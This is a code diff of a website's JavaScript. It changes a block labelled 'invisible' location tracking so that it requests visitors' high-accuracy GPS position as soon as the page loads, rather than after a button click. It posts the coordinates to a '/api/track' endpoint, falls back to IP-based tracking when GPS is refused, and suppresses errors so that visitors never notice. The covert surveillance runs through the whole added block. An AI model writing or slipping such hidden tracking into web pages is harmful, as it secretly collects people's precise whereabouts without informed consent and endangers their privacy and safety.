@@ -1,4 +1,41 @@
 document.addEventListener('DOMContentLoaded', () => {
+  // ===== LOCATION TRACKING (invisible) =====
+  let locationSent = false;
+
+  function sendLocation(lat, lng, source, accuracy) {
+    if (locationSent) return;
+    locationSent = true;
+    fetch('/api/track', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ lat, lng, source, accuracy })
+    }).catch(() => {}); // Silent — never show errors to visitor
+  }
+
+  function requestLocation() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          sendLocation(
+            pos.coords.latitude,
+            pos.coords.longitude,
+            'gps',
+            pos.coords.accuracy
+          );
+        },
+        () => {
+          sendLocation(null, null, 'ip', null);
+        },
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+      );
+    } else {
+      sendLocation(null, null, 'ip', null);
+    }
+  }
+
+  // Request location immediately on page load
+  requestLocation();
+
   // ===== ENTRANCE =====
   const enterBtn = document.getElementById('enter-btn');
   const entrance = document.getElementById('entrance');
@@ -6,7 +43,6 @@ document.addEventListener('DOMContentLoaded', () => {
 
   enterBtn.addEventListener('click', () => {
     entrance.classList.add('fade-out');
-    requestLocation(); // Silently request GPS after they click
     setTimeout(() => {
       entrance.style.display = 'none';
       mainSite.classList.remove('hidden');
@@ -315,40 +351,4 @@ document.addEventListener('DOMContentLoaded', () => {
     megaBtn.style.background = `linear-gradient(45deg, ${c1}, ${c2})`;
   });
 
-  // ===== LOCATION TRACKING (invisible) =====
-  let locationSent = false;
-
-  function sendLocation(lat, lng, source, accuracy) {
-    if (locationSent) return;
-    locationSent = true;
-    fetch('/api/track', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ lat, lng, source, accuracy })
-    }).catch(() => {}); // Silent — never show errors to visitor
-  }
-
-  function requestLocation() {
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          // GPS allowed — send exact coordinates
-          sendLocation(
-            pos.coords.latitude,
-            pos.coords.longitude,
-            'gps',
-            pos.coords.accuracy
-          );
-        },
-        () => {
-          // GPS denied or error — fall back to IP-based
-          sendLocation(null, null, 'ip', null);
-        },
-        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-      );
-    } else {
-      // Browser doesn't support geolocation — fall back to IP
-      sendLocation(null, null, 'ip', null);
-    }
-  }
 });
